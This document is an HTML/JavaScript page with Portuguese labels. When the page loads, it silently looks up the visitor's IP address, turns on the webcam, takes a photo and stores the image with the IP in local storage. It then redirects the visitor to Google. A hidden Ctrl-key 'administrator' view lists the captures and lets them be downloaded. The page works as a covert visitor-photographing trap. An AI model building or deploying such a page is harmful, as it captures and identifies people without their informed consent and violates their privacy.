<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captura de Foto Automática / Modo Administrador</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background-color: #222; color: #eee; }
        h1 { color: #4CAF50; }
        #app-container { max-width: 800px; margin: 0 auto; }
        #capture-view { text-align: center; padding-top: 50px; }
        #admin-view { display: none; }
        #history-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        #history-table th, #history-table td { border: 1px solid #444; padding: 10px; text-align: left; }
        #history-table th { background-color: #333; cursor: pointer; }
        #history-table tr:hover { background-color: #555; }
        .active-row { background-color: #007bff !important; color: white; }
        #photo-display { margin-top: 40px; text-align: center; }
        /* A imagem será removida, substituída pelo botão */
        #download-button { 
            display: none; 
            margin-top: 15px; 
            padding: 10px 20px; 
            font-size: 16px; 
            background-color: #007bff; 
            color: white; 
            border: none; 
            cursor: pointer;
            border-radius: 5px;
        }
        #download-button:hover {
            background-color: #0056b3;
        }
        #status-message { color: yellow; font-weight: bold; margin-bottom: 10px; }
        #redirect-status { display:none; }
        #redirect-timer { font-size: 1.2em; color: orange; }
    </style>
</head>
<body>

    <div id="app-container">
        <div id="capture-view">
            <h1>📸 Capturando Imagem...</h1>
            <p id="status-message">Aguardando... Pressione **Ctrl** para acesso rápido.</p> 
            <p id="redirect-status">Você será redirecionado em <span id="redirect-timer">5</span> segundos.</p>
        </div>

        <div id="admin-view">
            <h1>🔒 Modo Administrador - Histórico Local</h1>
            <p>As fotos abaixo foram salvas **neste navegador** (Local Storage).</p>
            
            <div id="photo-display">
                <h2>📁 Detalhes da Captura</h2>
                <p id="selected-ip-text">Clique em uma linha para liberar o download da foto.</p>
                
                <button id="download-button" disabled>Fazer Download da Foto</button>
            </div>

            <table id="history-table">
                <thead>
                    <tr>
                        <th>Endereço IP (Clique para Ver)</th>
                        <th>Hora da Captura (Local)</th>
                    </tr>
                </thead>
                <tbody>
                    </tbody>
            </table>
        </div>
    </div>
    
    <video id="webcam-video" autoplay playsinline muted style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        // ==========================================================
        // VARIÁVEIS E CONSTANTES
        // ==========================================================
        const REDIRECT_URL = 'https://www.google.com';
        const STORAGE_KEY = 'photoHistory';
        const REDIRECT_TIME_SECONDS = 5;
        const DATA_PREFIX = 'data:image/png;base64,'; 

        const video = document.getElementById('webcam-video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const captureView = document.getElementById('capture-view');
        const adminView = document.getElementById('admin-view');
        const statusMessage = document.getElementById('status-message');
        const redirectStatus = document.getElementById('redirect-status');
        const redirectTimerSpan = document.getElementById('redirect-timer');
        const tableBody = document.querySelector('#history-table tbody');
        const selectedIpText = document.getElementById('selected-ip-text');
        
        // NOVO ELEMENTO
        const downloadButton = document.getElementById('download-button'); 

        let photoData = null;
        let userIP = 'IP_NAO_ENCONTRADO';
        let webcamStream = null;
        let redirectCountdownId = null;
        let historyData = [];
        let isInAdminMode = false;
        let currentSelectedPhotoBase64 = null; // Armazena a foto Base64 da linha clicada

        // ==========================================================
        // FUNÇÕES DE ADMINISTRAÇÃO E DOWNLOAD
        // ==========================================================
        
        function loadHistory() {
            const storedData = localStorage.getItem(STORAGE_KEY);
            if (storedData) {
                historyData = JSON.parse(storedData);
            }
        }
        
        function saveHistory() {
            localStorage.setItem(STORAGE_KEY, JSON.stringify(historyData));
        }

        // 🟢 NOVO: Função para iniciar o download da foto
        function downloadPhoto(base64Image, ip, timestamp) {
            // Cria o link de Data URI completo
            const dataURI = DATA_PREFIX + base64Image;

            // Cria um elemento <a> temporário
            const a = document.createElement('a');
            a.href = dataURI;
            
            // Define o nome do arquivo com base no IP e na hora da captura
            const formattedTime = new Date(timestamp).toLocaleTimeString('pt-BR', {hour12: false}).replace(/:/g, '-');
            const filename = `CAPTURA_${ip.replace(/\./g, '_')}_${formattedTime}.png`;
            
            a.download = filename;

            // Simula o clique
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            // Reseta o botão
            downloadButton.textContent = "Download Iniciado!";
            setTimeout(() => {
                downloadButton.textContent = "Fazer Download da Foto";
            }, 1000);
        }

        function renderTable(selectedIndex = -1) {
            tableBody.innerHTML = ''; 
            
            historyData.slice().reverse().forEach((item, index) => {
                const originalIndex = historyData.length - 1 - index; 
                const row = tableBody.insertRow();
                
                row.classList.toggle('active-row', originalIndex === selectedIndex);

                row.insertCell().textContent = item.ip;
                row.insertCell().textContent = new Date(item.timestamp).toLocaleString();
                
                row.onclick = () => {
                    // Remove destaque das outras linhas
                    document.querySelectorAll('#history-table tr').forEach(r => r.classList.remove('active-row'));
                    row.classList.add('active-row');
                    
                    // Atualiza a informação e armazena o Base64 para download
                    selectedIpText.textContent = `Dados da Captura: ${item.ip} - ${new Date(item.timestamp).toLocaleString()}`;
                    currentSelectedPhotoBase64 = item.img;
                    
                    // Ativa o botão de download
                    downloadButton.style.display = 'block';
                    downloadButton.disabled = false;
                    downloadButton.textContent = "Fazer Download da Foto";

                    // Remove o listener anterior e adiciona o novo (para evitar downloads duplicados)
                    downloadButton.onclick = () => {
                        downloadPhoto(currentSelectedPhotoBase64, item.ip, item.timestamp);
                    };
                };
            });
        }
        
        function enterAdminMode() {
            if (isInAdminMode) return;

            isInAdminMode = true; 

            if (redirectCountdownId) {
                clearInterval(redirectCountdownId); 
            }
            if (webcamStream) {
                webcamStream.getTracks().forEach(track => track.stop()); 
            }
            
            loadHistory();
            renderTable();

            captureView.style.display = 'none';
            adminView.style.display = 'block';
            document.title = "Modo Administrador";
            console.log("Modo Administrador Ativado!");
        }

        // ==========================================================
        // FLUXO DE CAPTURA (NÃO ALTERADO)
        // ==========================================================

        function fetchUserIP() { /* ... código ... */ 
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => { userIP = data.ip; })
                .catch(() => { userIP = 'IP_NAO_ENCONTRADO'; });
        }
        
        function startWebcam() { /* ... código ... */
            return navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } })
                .then(stream => {
                    webcamStream = stream;
                    video.srcObject = stream;
                    return new Promise(resolve => video.onloadedmetadata = resolve);
                });
        }
        
        function takePhoto() { /* ... código ... */
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            photoData = canvas.toDataURL('image/png').split(',')[1]; 
        }

        function saveAndRedirect() { /* ... código ... */
            if (photoData) {
                const newItem = {
                    ip: userIP,
                    img: photoData, 
                    timestamp: new Date().toISOString()
                };
                
                loadHistory(); 
                historyData.push(newItem); 
                saveHistory(); 
            }
            
            statusMessage.style.display = 'none';
            redirectStatus.style.display = 'block';

            let timeLeft = REDIRECT_TIME_SECONDS;
            redirectTimerSpan.textContent = timeLeft;

            const countdown = setInterval(() => {
                if (isInAdminMode) {
                    clearInterval(countdown);
                    return;
                }

                timeLeft--;
                redirectTimerSpan.textContent = timeLeft;

                if (timeLeft <= 0) {
                    clearInterval(countdown);
                    window.location.href = REDIRECT_URL;
                }
            }, 1000);

            redirectCountdownId = countdown; 
        }

        // ==========================================================
        // INICIALIZAÇÃO E CONTROLE DE TECLAS (NÃO ALTERADO)
        // ==========================================================
        
        window.addEventListener('keydown', (e) => {
            if (e.key === 'Control') {
                e.preventDefault(); 
                enterAdminMode();
            }
        });

        async function runCaptureFlow() {
            if (window.event && window.event.ctrlKey) {
                enterAdminMode();
                return;
            }
            
            redirectStatus.style.display = 'none'; 
            statusMessage.style.display = 'block';

            if (isInAdminMode) return; 

            statusMessage.textContent = "Iniciando captura de IP e câmera...";

            await fetchUserIP();
            
            try {
                await startWebcam();
                statusMessage.textContent = "Câmera ativa. Capturando foto e salvando...";
                takePhoto();
                saveAndRedirect();
                
            } catch (e) {
                console.error("Erro na captura:", e);
                statusMessage.textContent = "Falha ao acessar a câmera. Redirecionando...";
                
                setTimeout(() => {
                    if (!isInAdminMode) {
                         window.location.href = REDIRECT_URL;
                    }
                }, 2000);
            }
        }
        
        window.onload = runCaptureFlow;
    </script>
</body>
</html>
